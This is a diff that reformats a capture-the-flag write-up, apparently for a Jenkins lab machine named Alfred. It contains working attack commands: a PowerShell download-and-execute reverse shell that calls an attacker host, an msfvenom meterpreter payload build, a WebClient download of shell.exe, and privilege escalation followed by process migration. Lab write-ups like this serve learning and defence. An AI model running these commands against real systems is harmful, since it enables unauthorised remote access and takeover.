@@ -50,7 +50,9 @@ For this,
 - Start a simple webserver using `python3 -m http.server` in the same directory. So the victim will be able to download the powershell code file.
 - Frame the command that needs to get executed on the operating system. In this case, I will listen for remote shell on 8001 port.
 
- ` powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.18.4:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.18.4 -Port 8001 `
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.18.4:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.18.4 -Port 8001
+```
 
 - Open netcat in another terminal and listen on 8001 port. `nc -lnvp 8001`
 - Navigate to Jenkins and goto, project configuration and paste the powershell command that was framed above under build. So our command will become part of build process.
@@ -75,10 +77,12 @@ For this,
 
 
 ### Getting a Meterpreter shell
-For much convenience and to work on privilege escalation, lets get meterpreter shell.
+For much convenience and to work on privilege escalation, lets get a Meterpreter shell.
 - Create a payload file which opens a reverse shell and save it in the same place where the webserver is running, so the victim will be able to download.
 
-`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.18.4 LPORT=8002 -f exe -o shell.exe`
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.18.4 LPORT=8002 -f exe -o shell.exe
+```
 
 - Create a reverse shell listener using Metasploit with exploit/multi/handler and having a PAYLOAD windows/meterpreter/reverse_tcp LHOST 10.2.18.4 LPORT 8002.
 
@@ -89,7 +93,7 @@ msf5 exploit(multi/handler) > run
 
 - Get this shell.exe downloaded to victim machine by executing the powershell command on the reverse shell that was already opened and start the process.
 
-```
+```bash
 PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.18.4:8000/shell.exe','shell.exe')"
 PS C:\Users\bruce\Desktop> dir
 
@@ -126,33 +130,33 @@ PS C:\Users\bruce\Desktop> Start-Process "shell.exe"
 - Verify, by using `getuid`  
 
 ```
-     meterpreter > getuid
-     Server username: NT AUTHORITY\SYSTEM
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
 ```
 - Though we have privileged user, due to impersonating we will not be able to access complete system due to windows security.  To test this, goto C:\Windows\system32\config directory and will see only files which have full permissions.
 
 ```
-    meterpreter > dir
-    Listing: C:\Windows\system32\config
-    ===================================
+meterpreter > dir
+Listing: C:\Windows\system32\config
+===================================
 
-    Mode             Size  Type  Last modified              Name
-    ----             ----  ----  -------------              ----
-    40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  Journal
-    40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  RegBack
-    40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  TxR
-    40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  systemprofile
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  Journal
+40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  RegBack
+40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  TxR
+40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  systemprofile
 ```
 
 - We need migrate our process (shell.exe) whose pid is 1440, to a more stable and equally privileged process by checking the processes that are running on the victim using ps.
 
 ```
-  1440  2848  shell.exe             x86   0        alfred\bruce                  C:\Users\bruce\Desktop\shell.exe
+1440  2848  shell.exe             x86   0        alfred\bruce                  C:\Users\bruce\Desktop\shell.exe
 ```
 
 ```
- meterpreter > ps
-
+meterpreter > ps
+(ommitted other entries..)
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 
 meterpreter > migrate 668
